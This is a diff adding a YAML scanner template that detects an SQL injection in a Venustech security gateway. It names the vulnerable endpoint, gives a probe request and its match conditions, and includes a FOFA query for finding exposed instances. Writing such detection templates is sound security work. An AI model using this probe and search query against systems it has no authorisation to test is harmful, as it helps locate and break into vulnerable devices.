@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: |
+      checkname=123&tagid=123
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"code":16'
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/ops/index.php?c=Reportguide&a=checkrn'
+id: venustech-reportguide-sqli
+info:
+  author: zan8in
+  description: |
+    FOFA: app="启明星辰-天玥网络安全审计"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 启明天钥安全网关前台 sql 注入
+  severity: high
+  tags: venustech,sqli,argus-import
